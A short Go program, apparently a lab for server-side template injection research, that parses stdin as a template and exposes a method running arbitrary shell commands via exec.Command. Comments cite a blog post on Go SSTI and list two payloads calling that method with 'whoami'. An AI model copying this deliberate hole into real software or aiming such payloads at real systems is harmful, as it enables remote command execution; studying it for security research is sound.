package main

import (
	"bufio"
	"html/template"
	"log"
	"os"
	"os/exec"
)

type Program string

func (p Program) Secret(test string) string {
	out, _ := exec.Command(test).CombinedOutput()
	return string(out)
}
func (p Program) Label(test string) string {
	return "This is " + string(test)
}
func main() {
	reader := bufio.NewReader(os.Stdin)
	text, _ := reader.ReadString('\n')
	tmpl, err := template.New("").Parse(text)
	if err != nil {
		log.Fatalf("Parse: %v", err)
	}
	tmpl.Execute(os.Stdin, Program("Intigriti"))
}

// https://www.onsecurity.io/blog/go-ssti-method-research/

// payload
// {{.Secret "whoami"}}
// {{"whoami"| .Secret}}
